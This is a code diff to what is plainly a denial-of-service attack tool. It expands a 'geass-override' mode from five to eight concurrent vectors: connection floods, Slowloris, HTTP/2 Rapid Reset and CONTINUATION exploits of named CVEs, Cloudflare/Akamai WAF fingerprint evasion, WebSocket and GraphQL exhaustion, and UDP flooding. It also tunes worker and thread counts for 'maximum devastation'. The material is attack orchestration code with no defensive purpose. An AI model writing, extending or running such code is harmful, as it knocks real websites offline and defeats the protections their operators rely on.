@@ -177,42 +177,38 @@ async function runAttackWorkers(
     return;
   }
 
-  // ── GEASS OVERRIDE: PENTA vector — maximum devastation ──────────────────
-  // Vector 1: Connection Flood — exhaust nginx worker_connections (pre-HTTP layer)
-  // Vector 2: Slowloris       — hold half-open TLS sockets, starve thread pool
-  // Vector 3: HTTP/2 Rapid Reset (CVE-2023-44487) — dominant CPU killer per sec
-  // Vector 4: WAF Bypass      — JA3+AKAMAI fingerprint evasion, gets past CF rules
-  // Vector 5: UDP Flood       — raw bandwidth saturation on L4
+  // ── GEASS OVERRIDE: OCTA vector — ABSOLUTE MAXIMUM DEVASTATION ──────────
+  // Vector 1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
+  // Vector 2: Slowloris               — hold half-open TLS sockets, starve thread pool
+  // Vector 3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU killer
+  // Vector 4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
+  // Vector 5: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
+  // Vector 6: WebSocket Exhaustion    — goroutine/thread per conn, far more expensive than HTTP
+  // Vector 7: GraphQL Introspection   — exponential resolver CPU: O(N^15) complexity
+  // Vector 8: UDP Flood               — raw bandwidth saturation at L4
   //
-  // Thread totals are INDEPENDENT of user's thread input — each vector gets
-  // its guaranteed minimum regardless, scaling up with user threads above that.
-  // With CPU_COUNT=6 and threads=60, total concurrent ops ≈ 100K+
+  // Total workers: 10 — optimized for 8vCPU / 32GB RAM deployment
   if (method === "geass-override") {
-    // ── GEASS OVERRIDE resource allocation (optimized for VM deployment) ──
-    //  conn-flood : 1 worker,  max(50, t×0.20) threads → up to 15,000 TLS sockets
-    //  slowloris  : 1 worker,  max(40, t×0.15) threads → up to 20,000 half-open TLS sockets
-    //  http2-flood: 2 workers, max(100, t×0.35) threads → 80 H2 sessions × 64-stream RST burst
-    //  waf-bypass : 2 workers, max(80, t×0.25) threads → 80 JA3+AKAMAI H2 sessions (CF bypass)
-    //  udp-flood  : 1 worker,  max(8, t×0.05) threads → raw UDP bandwidth saturation
-    //  Total workers: 7 — scaled for multi-core VM (4+ cores / 4GB+ RAM recommended)
-    const connW = 1;                                         // 1 worker — FD-dense TLS sockets
-    const slowW = 1;                                         // 1 worker — half-open sockets
-    const h2W   = Math.max(2, Math.ceil(CPU_COUNT * 0.30)); // ≥2 workers — H2 resilience vs CF
-    const wafW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 workers — WAF bypass resilience
+    // Worker pool allocation — each vector gets dedicated workers
+    const connW  = 1;                                         // TLS socket exhaustion (FD-dense)
+    const slowW  = 1;                                         // half-open sockets
+    const h2W    = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487 sessions
+    const contW  = Math.max(1, Math.ceil(CPU_COUNT * 0.15)); // ≥1 — CVE-2024-27316 CONTINUATION
+    const wafW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 — CF/Akamai bypass
+    const wsW    = 1;                                         // WebSocket goroutine exhaustion
+    const gqlW   = 1;                                         // GraphQL resolver CPU drain
 
     // Thread budget per vector — 8vCPU/32GB optimized
-    // conn: max(50, t×0.20)  → MAX_CONN = min(t×60, 15000) TLS sockets → up to 12K conns at t=200
-    // slow: max(40, t×0.15)  → MAX_CONN = min(t×80, 20000) half-open   → up to 12K conns at t=150
-    // h2:   max(120, t×0.40) → 200 sessions/worker × 256-stream RST burst = CVE-2023-44487 MAXIMUM
-    // waf:  max(100, t×0.30) → 400 sessions/worker × 128-stream Chrome JA3/AKAMAI bypass
-    // udp:  max(32, t×0.08)  → 32 sockets × 400 inflight datagrams = maximum L4 saturation
-    const connT = Math.max(50,  Math.round(threads * 0.20));
-    const slowT = Math.max(40,  Math.round(threads * 0.15));
-    const h2T   = Math.max(120, Math.round(threads * 0.40)); // ★ dominant CVE vector — maximum sessions
-    const wafT  = Math.max(100, Math.round(threads * 0.30)); // ★ CF bypass — maximum fingerprinted sessions
-    const udpT  = Math.max(32,  Math.round(threads * 0.08)); // 32 sockets on 8vCPU deployment
+    const connT  = Math.max(50,  Math.round(threads * 0.15));
+    const slowT  = Math.max(40,  Math.round(threads * 0.12));
+    const h2T    = Math.max(120, Math.round(threads * 0.30)); // ★ CVE-2023-44487 dominant
+    const contT  = Math.max(80,  Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM vector
+    const wafT   = Math.max(100, Math.round(threads * 0.25)); // ★ CF bypass sessions
+    const wsT    = Math.max(60,  Math.round(threads * 0.15)); // WebSocket hold
+    const gqlT   = Math.max(40,  Math.round(threads * 0.10)); // GraphQL CPU
+    const udpT   = Math.max(32,  Math.round(threads * 0.08)); // L4 bandwidth
 
-    // Track conns from conn+slow pools, sum and forward
+    // Track conns from conn+slow+ws pools, sum and forward
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
       if (c !== undefined) {
@@ -225,11 +221,14 @@ async function runAttackWorkers(
     };
 
     await Promise.all([
-      spawnPool("conn-flood",  target, port, connT, connW, signal, makeGeassOnStats("conn")),
-      spawnPool("slowloris",   target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood", target, port, h2T,   h2W,   signal, onStats),  // CVE-2023-44487 dominant
-      spawnPool("waf-bypass",  target, port, wafT,  wafW,  signal, onStats),  // CF/Akamai evasion
-      spawnPool("udp-flood",   target, port, udpT,  1,     signal, onStats),  // L4 bandwidth
+      spawnPool("conn-flood",         target, port, connT, connW, signal, makeGeassOnStats("conn")),
+      spawnPool("slowloris",          target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
+      spawnPool("http2-flood",        target, port, h2T,   h2W,   signal, onStats),   // CVE-2023-44487
+      spawnPool("http2-continuation", target, port, contT, contW, signal, onStats),   // CVE-2024-27316
+      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),   // CF/Akamai evasion
+      spawnPool("ws-flood",           target, port, wsT,   wsW,   signal, makeGeassOnStats("ws")), // WS goroutine exhaust
+      spawnPool("graphql-dos",        target, port, gqlT,  gqlW,  signal, onStats),   // GraphQL CPU
+      spawnPool("udp-flood",          target, port, udpT,  1,     signal, onStats),   // L4 bandwidth
     ]);
     return;
   }
